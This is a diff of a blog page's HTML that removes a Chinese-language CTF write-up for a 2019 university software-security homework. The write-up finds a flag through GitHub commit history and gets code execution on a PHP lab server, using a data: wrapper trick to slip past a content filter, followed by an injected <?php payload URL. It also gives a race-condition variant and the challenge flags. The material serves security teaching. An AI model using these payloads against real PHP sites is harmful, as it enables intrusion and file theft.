@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>程式安全::HW3 Write-up · NiNi&#39;s Den</title>
+    <title>NiNi&#39;s Den</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -206,23 +206,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >NiNi&#39;s Den</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">程式安全::HW3 Write-up</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>NiNi's Den</a>
 </header>
@@ -234,69 +223,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/DSC00041.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            程式安全::HW3 Write-up
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>Words: <span class="post-count word-count">1,531</span>Reading time: <span class="post-count reading-time">7 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/11/21</span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -397,123 +341,41 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <p>2019 年交大程式安全 HW3 write-up</p>
-<a id="more"></a>
-<h1 id="Unexploitable-100-point"><a href="#Unexploitable-100-point" class="headerlink" title="Unexploitable [100 point]"></a>Unexploitable [100 point]</h1><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>簡單檢查一下網頁原始碼，可以發現網頁很簡單，只有 Matrix rain 特效的 javascript 還有一個檢查 konami 秘技的 k.js，<br>cookie 的部分也沒有什麼好看的，來檢查一下 header 可以發現該網頁可能是架在 github 上的某個靜態網站。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$ curl -kI https://unexploitable.kaibro.tw/</div><div class="line">HTTP/2 200</div><div class="line">server: GitHub.com</div><div class="line">content-type: text/html; charset=utf-8</div><div class="line">last-modified: Thu, 17 Oct 2019 10:11:00 GMT</div><div class="line">etag: <span class="string">"5da83e34-4f2"</span></div><div class="line">access-control-allow-origin: *</div><div class="line">expires: Wed, 20 Nov 2019 17:32:45 GMT</div><div class="line">cache-control: max-age=600</div><div class="line">x-proxy-cache: MISS</div><div class="line">x-github-request-id: C7D4:5C02:1DA1BF:25B879:5DD57664</div><div class="line">accept-ranges: bytes</div><div class="line">date: Wed, 20 Nov 2019 17:22:46 GMT</div><div class="line">via: 1.1 varnish</div><div class="line">age: 0</div><div class="line">x-served-by: cache-hkg17931-HKG</div><div class="line">x-cache: MISS</div><div class="line">x-cache-hits: 0</div><div class="line">x-timer: S1574270566.811443,VS0,VE228</div><div class="line">vary: Accept-Encoding</div><div class="line">x-fastly-request-id: bc1e55a82c40be45132ceda0c55024153b3be9fb</div><div class="line">content-length: 1266</div></pre></td></tr></table></figure>
-<p>又或者是在訪問 url ，例如 <a href="https://unexploitable.kaibro.tw/test" target="_blank" rel="external">https://unexploitable.kaibro.tw/test</a> ，時可能會得到錯誤：</p>
-<img src="/tw/程式安全-HW3-Write-up/unexploitable.png" alt="unexploitable.png" title="">
-<p>感覺 github 上應該有藏寶，嘗試先找到 repo，透過 dig 指令找到 unexploitable.kaibro.tw. 是 bucharesti.github.io. 的 CNAME：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ dig unexploitable.kaibro.tw</div><div class="line"></div><div class="line">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; unexploitable.kaibro.tw</div><div class="line">;; global options: +cmd</div><div class="line">;; Got answer:</div><div class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 36406</div><div class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 8, ADDITIONAL: 13</div><div class="line"></div><div class="line">;; OPT PSEUDOSECTION:</div><div class="line">; EDNS: version: 0, flags:; udp: 4096</div><div class="line">;; QUESTION SECTION:</div><div class="line">;unexploitable.kaibro.tw.	IN	A</div><div class="line"></div><div class="line">;; ANSWER SECTION:</div><div class="line">unexploitable.kaibro.tw. 3078	IN	CNAME	bucharesti.github.io.</div><div class="line">bucharesti.github.io.	3078	IN	A	185.199.109.153</div><div class="line">bucharesti.github.io.	3078	IN	A	185.199.110.153</div><div class="line">bucharesti.github.io.	3078	IN	A	185.199.111.153</div><div class="line">bucharesti.github.io.	3078	IN	A	185.199.108.153</div></pre></td></tr></table></figure>
-<p>找到 repo 後可以發現目前的版本是沒有 flag 的，查看 commit 紀錄可以發現有條 commit message 是 <code>delete secret file</code>:</p>
-<img src="/tw/程式安全-HW3-Write-up/unex_2.png" alt="unex_2.png" title="">
-<p>可以在裡面找到 flag : <code>FLAG{baby_recon_dont_forget_to_look_github_page}</code></p>
-<h1 id="Safe-R-W-200-point"><a href="#Safe-R-W-200-point" class="headerlink" title="Safe R/W [200 point]"></a>Safe R/W [200 point]</h1><h2 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h2><p>首先閱讀一下 source code，可以知道流程大概是：</p>
-<ol>
-<li>根據使用者指紋建立一個 sandbox</li>
-<li>可指定要建立的資料夾名稱 <code>$f</code>，waf 檢查不包含 <code>.</code> <code>/</code> <code>-</code> 任一字元</li>
-<li>可指定要被 <code>include</code> 的檔案名稱 <code>$i</code>，waf 檢查不包含 <code>ph</code> 字串</li>
-<li>可指定要往檔案 <code>meow</code> 寫入的內容 <code>$c</code>，waf 檢查長度不超過 20 bytes</li>
-<li>刪除資料夾</li>
-</ol>
-<p>由於 5. 會刪除資料夾，所以我們必須要在 <code>@include($i);</code> 的時候就讓他執行 php 程式碼，或者是直接把 flag include 進來，<br>但是作業有說 <code>open_basedir=/var/www/html/</code> 可以直接假設 flag 在這個資料夾之外，所以先不考慮第二條路。</p>
-<p>到這裡可以發現我們首先要解決的難點是如何通過這個檢查，讓我們可以把 <code>&lt;?php</code> 塞進去我們要 include 的檔案來 RCE：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">stripos(file_get_contents($i), <span class="string">'&lt;'</span>) === <span class="keyword">FALSE</span></div></pre></td></tr></table></figure>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先我有個大膽的想法，第一行測不到 <code>&#39;&lt;?php&#39;</code>，第四行又跑出 <code>&#39;&lt;?php&#39;</code> 不就洗洗睡了嗎</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($i) &amp;&amp; stripos(file_get_contents($i), <span class="string">'&lt;'</span>) === <span class="keyword">FALSE</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;div class='container'&gt;"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Here is your file content:&lt;/h2&gt;"</span>;</div><div class="line">    @<span class="keyword">include</span>($i);</div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/div&gt;"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>看到 <code>file_get_contents</code> 應該會想到各種 protocols 跟 wrappers，<br>接下來可以透過 <code>php -a</code> 打開 php 的 interactive shell 做簡單的測試，<br>php 在 defualt 的情況下對於開檔還有 include 的設置如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">phpinfo();</div><div class="line">...</div><div class="line">allow_url_fopen =&gt; On =&gt; On</div><div class="line">allow_url_include =&gt; Off =&gt; Off</div></pre></td></tr></table></figure>
-<p>一個有開一個沒開，<br>也就是說我們可能可以透過 protocols/wrapper 來讓檢查的內容與實際上被呈現的內容產生不一致，<br>這裡可以枚舉<a href="https://www.php.net/manual/en/wrappers.php" target="_blank" rel="external">各種支援的 protocols/wrapper</a>，<br>然後既然都給 source code 了，直接整份拿下來架起來 debug 最快，這裡順手打開 error message：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ini_set(<span class="string">'display_errors'</span>,<span class="string">'1'</span>);</div><div class="line">error_reporting(E_ALL);</div></pre></td></tr></table></figure>
-<p>假設遇到不支援（包括未開啟），預設會使用 <code>file://</code> 也就是直接當檔案讀，所以可以透過下列方式來測試是否可以利用：</p>
-<img src="/tw/程式安全-HW3-Write-up/safeRW.png" alt="safeRW.png" title="">
-<p>大部分的 protocols/wrapper 都需要在 config php 的時候開啟，基本上不期待遠端有打開，試下去感覺也是沒有，<br>本來猜想簡單的 <code>http:</code> 跟 <code>http:///meow</code> 應該可以騙過 file_get_contents 去拿取外部資源，然後在 include 時被當作路徑，<br>但會發現雖然 include 沒啟用 url 但是遇到 <code>data://</code> 跟 <code>http://</code> 還是會吐錯誤給你，<br>可以發現我們的輸入不會被當作路徑，反而會是說這個 protocol 不允許然後直接爛掉</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Warning: <span class="keyword">include</span>(): data:<span class="comment">// wrapper is disabled in the server configuration by allow_url_include=0 in /var/www/html/asdfasdfasdfasdf.php on line 46</span></div><div class="line"></div><div class="line">Warning: <span class="keyword">include</span>(data:<span class="comment">//meow): failed to open stream: no suitable wrapper could be found in /var/www/html/asdfasdfasdfasdf.php on line 46</span></div><div class="line"></div><div class="line">Warning: <span class="keyword">include</span>(): Failed opening <span class="string">'data://meow'</span> <span class="keyword">for</span> inclusion (include_path=<span class="string">'.:/usr/share/php'</span>) in /<span class="keyword">var</span>/www/html/asdfasdfasdfasdf.php on line <span class="number">46</span></div></pre></td></tr></table></figure>
-<p>試到 <code>data://</code> 的時候可以看到下面有個人在 11 年前告訴你 <code>data:</code> 也是支援的，在 local 測一下 <code>data:</code>跟 <code>data:/meow</code> 的組合：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Warning: file_get_contents(data:/meow): failed to open stream: rfc2397: no comma in URL in /<span class="keyword">var</span>/www/html/asdfasdfasdfasdf.php on line <span class="number">41</span></div></pre></td></tr></table></figure>
-<p>發現他會在 <code>file_get_contents</code> 時吃 warning 但是 <code>include</code>卻沒噴東西出來！！<br>所以這裡可以透過有殘缺的 <code>data:</code> 形式讓 <code>file_get_contents</code> 打不開檔案導致回傳 <code>false</code> 從而通過判斷：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">php &gt; $i = <span class="string">"zzz"</span>;</div><div class="line">php &gt; var_dump(file_get_contents($i));</div><div class="line"></div><div class="line">Warning: file_get_contents(zzz): failed to open stream: No such file <span class="keyword">or</span> directory in php shell code on line <span class="number">1</span></div><div class="line">bool(<span class="keyword">false</span>)</div><div class="line">php &gt; var_dump(stripos(file_get_contents($i), <span class="string">'&lt;'</span>));</div><div class="line"></div><div class="line">Warning: file_get_contents(zzz): failed to open stream: No such file <span class="keyword">or</span> directory in php shell code on line <span class="number">1</span></div><div class="line">bool(<span class="keyword">false</span>)</div></pre></td></tr></table></figure>
-<p>當然你也可以選擇透過正常的組合來通過判斷 <code>data:,</code> 跟 <code>data:,/meow</code> (<code>data:,/meow</code> 就是 plain text 的 <code>/meow</code>)：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">php &gt; $i = <span class="string">"data:,/meow"</span>;</div><div class="line">php &gt; var_dump(file_get_contents($i));</div><div class="line">string(<span class="number">5</span>) <span class="string">"/meow"</span></div><div class="line">php &gt; var_dump(stripos(file_get_contents($i), <span class="string">'&lt;'</span>) );</div><div class="line">bool(<span class="keyword">false</span>)</div></pre></td></tr></table></figure>
-<p>到這裡我們就可以 RCE 了：</p>
-<img src="/tw/程式安全-HW3-Write-up/exploit.png" alt="exploit.png" title="">
-<p>當然可以用 20 byte 的 payload 就把 flag 猜出來<br>但還是有點不自由，有牆就要爬一下，這邊拿上課教的東西隨便戳個:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">php &gt; $c = <span class="keyword">array</span>(<span class="string">'ls'</span>,<span class="string">' -la '</span>,<span class="string">' ../../../'</span>);</div><div class="line">php &gt; var_dump(strlen($c) &gt; <span class="number">20</span>);</div><div class="line">bool(<span class="keyword">false</span>)</div><div class="line">php &gt; file_put_contents(<span class="string">"meow"</span>, $c);</div><div class="line">php &gt; <span class="keyword">echo</span> file_get_contents(<span class="string">"meow"</span>);</div><div class="line">ls -la  ../../../</div></pre></td></tr></table></figure>
-<p>然後你就可以愛怎麼打怎麼打：</p>
-<p><code>https://edu-ctf.csie.org:10155/?f=data%3A&amp;i=data%3A%2Fmeow&amp;c[]=%3C%3Fphp+echo+%60cat+../../../../../../../../../../../../../../../../../../flag_is_here%60%3B</code></p>
-<p>flag: <code>FLAG{w3lc0me_t0_th3_PHP_W0r1d}</code></p>
-<h2 id="Other-Solution"><a href="#Other-Solution" class="headerlink" title="Other Solution"></a>Other Solution</h2><p>前面提到的主要思路就是：</p>
-<blockquote>
-<p>我有個大膽的想法，第一行測不到 <code>&#39;&lt;?php&#39;</code>，第四行又跑出 <code>&#39;&lt;?php&#39;</code></p>
-</blockquote>
-<p>這可以透過 race condition 來達成，<br>因為一四行間讀取的時間差，還有根據相同的 ip ， useragent 我們會一直存取到同一個資料夾，<br>透過多個 client 我們可以撞到幾次他檢查完我們又把內容改掉，讓已經通過檢查的 server 去 include 我們修改過的 meow。</p>
-
-    </article>
-    <!-- license  -->
+            <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>Original Author: <a href="http://blog.terrynini.tw">Terrynini</a>
-            <p>Original link: <a href="http://blog.terrynini.tw/tw/程式安全-HW3-Write-up/">http://blog.terrynini.tw/tw/程式安全-HW3-Write-up/</a>
-            <p>Publish at: <a href="http://blog.terrynini.tw/tw/程式安全-HW3-Write-up/">November 21st 2019, 1:16:23</a>
-            <p>Copyright: This article is licensed under <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></p>
+    
+
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/tw/程式安全-HW4-Write-up/" >
+            
+                <span>程式安全::HW4 Write-up</span>
+        </a>
+        <div class="abstract-content">
+            <p>2019 年交大程式安全 HW4 write-up</p>
+            <p><a class="abstract-title " href="/tw/程式安全-HW4-Write-up/">➡read more</a></p>
         </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/12/18</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
+    
+</div>
+            
+        </div>
+    </article>
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/tw/程式安全-HW4-Write-up/" title= "程式安全::HW4 Write-up">
-                    <div class="nextTitle">程式安全::HW4 Write-up</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/tw/TIL-Windows-Services-Debug/" title= "TIL::Windows Services Debug">
-                    <div class="prevTitle">TIL::Windows Services Debug</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
-    <div id="disqus_thread"></div>
-    <script>
-        /**
-    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-        
-        var disqus_config = function () {
-        this.page.url = "http://blog.terrynini.tw/tw/程式安全-HW3-Write-up/";  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = "程式安全::HW3 Write-up"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-        };
-        
-        (function () { // DON'T EDIT BELOW THIS LINE
-            var d = document, s = d.createElement('script');
-            s.src = 'https://terrynini.disqus.com/embed.js';
-            s.setAttribute('data-timestamp', +new Date());
-            (d.head || d.body).appendChild(s);
-        })();
-
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -594,24 +456,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unexploitable-100-point"><span class="toc-number">1.</span> <span class="toc-text">Unexploitable [100 point]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Safe-R-W-200-point"><span class="toc-number">2.</span> <span class="toc-text">Safe R/W [200 point]</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Other-Solution"><span class="toc-number">2.3.</span> <span class="toc-text">Other Solution</span></a></li></ol></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1311,8 +1155,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     <script type="text/x-mathjax-config">
     MathJax.Hub.Config({
